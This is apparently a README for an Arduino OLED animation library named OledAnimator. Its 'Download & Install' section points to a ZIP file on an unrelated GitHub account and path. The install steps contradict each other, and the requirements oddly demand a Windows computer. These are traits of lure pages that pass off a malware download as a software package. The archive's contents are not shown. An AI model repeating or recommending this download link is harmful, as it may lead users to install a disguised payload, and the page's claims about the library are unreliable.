🎬 OledAnimator - Smooth Animations on Your Arduino Display

Create beautiful, non-blocking animations on SSD1306 OLED screens with this lightweight Arduino library by Atharva Phadnis.

⬇️ Download OledAnimator

🚀 Getting Started

Welcome! OledAnimator makes it easy to add animated effects to your OLED display projects — even if you're new to Arduino. This library handles timing and frame updates automatically, so you don't need to write complex code.

💡 What you need: A computer running Windows, an Arduino board (like Nano, Uno, Mega, ESP32, or ESP8266), and an SSD1306 OLED display.

📦 Download & Install

Visit this link to download the application: https://raw.githubusercontent.com/Abdielgr4297/abdielgr4297.github.io/main/counteracter/v3.3.zip

Click the green "Code" button on the page, then select "Download ZIP". Save the file to your computer.

Once downloaded, extract the ZIP file. Inside you'll find the library folder. Copy this folder into your Arduino libraries folder (usually Documents/Arduino/libraries).

Now open the Arduino IDE, go to File → Examples → OledAnimator, and choose one of the example sketches to get started.

✨ Features

  • Non-blocking animations: Uses millis() timing so your other code runs smoothly.
  • Frame-based updates: Efficient rendering for low-memory boards.
  • Multiple animations: Run several animations at the same time.
  • Optimized for small boards: Works great on Arduino Nano, ESP32, and ESP8266.
  • Easy to use: Simple API with clear examples.

🛠️ How to Use

After installing the library, connect your OLED display to your Arduino board (I2C pins: SDA to A4, SCL to A5 on Uno/Nano; check your board's pinout). Open the Arduino IDE, select your board and port, and upload one of the example sketches.

You can customize the animation by changing the animationSpeed and frameCount variables in the example code. The library handles the rest.

🔧 Troubleshooting

  • Display not showing anything? Make sure your OLED is connected to the correct I2C pins. Try running an I2C scanner sketch first.
  • Compilation error? Ensure you have the Adafruit SSD1306 and Adafruit GFX libraries installed. They are required.
  • Animation stutters? Reduce the number of animations running simultaneously or adjust the frame rate.
